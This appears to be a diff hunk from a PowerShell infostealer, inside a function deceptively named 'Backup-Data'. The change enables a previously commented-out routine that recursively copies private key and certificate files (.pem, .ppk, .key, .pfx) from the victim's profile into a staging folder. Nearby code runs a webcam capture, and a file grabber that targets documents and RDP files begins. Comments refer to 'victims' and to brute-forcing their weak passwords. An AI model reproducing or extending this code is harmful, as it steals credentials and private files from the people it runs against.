@@ -790,18 +790,20 @@ function Backup-Data {
     $invokewebcam.WaitForExit()
 
     # Works since most victims will have a weak password which can be bruteforced
-    #function ExportPrivateKeys {
-    #    $privatekeysfolder = "$important_files\Certificates & Private Keys"
-    #    New-Item -ItemType Directory -Path $privatekeysfolder -Force
-    #    $sourceDirectory = "$env:userprofile"
-    #    $destinationDirectory = "$important_files\Certificates & Private Keys"
-    #    $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
-    #    $foundFiles = Get-ChildItem -Path $sourceDirectory -Recurse -Include $fileExtensions -File
-    #    foreach ($file in $foundFiles) {
-    #        Copy-Item -Path $file.FullName -Destination $destinationDirectory -Force
-    #    }
-    #}
-    #ExportPrivateKeys
+    function ExportPrivateKeys {
+    $privatekeysfolder = "$important_files\Certificates and Private Keys"
+    New-Item -ItemType Directory -Path $privatekeysfolder -Force | Out-Null
+    $sourceDirectory = "$env:userprofile"
+    $fileExtensions = @("*.pem", "*.ppk", "*.key", "*.pfx")
+
+    foreach ($extension in $fileExtensions) {
+        $foundFiles = Get-ChildItem -Path $sourceDirectory -Filter $extension -File -Recurse
+        foreach ($file in $foundFiles) {
+            Copy-Item -Path $file.FullName -Destination $privatekeysfolder -Force
+            }
+         }
+    }
+    ExportPrivateKeys
 
     function FilesGrabber {
         $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
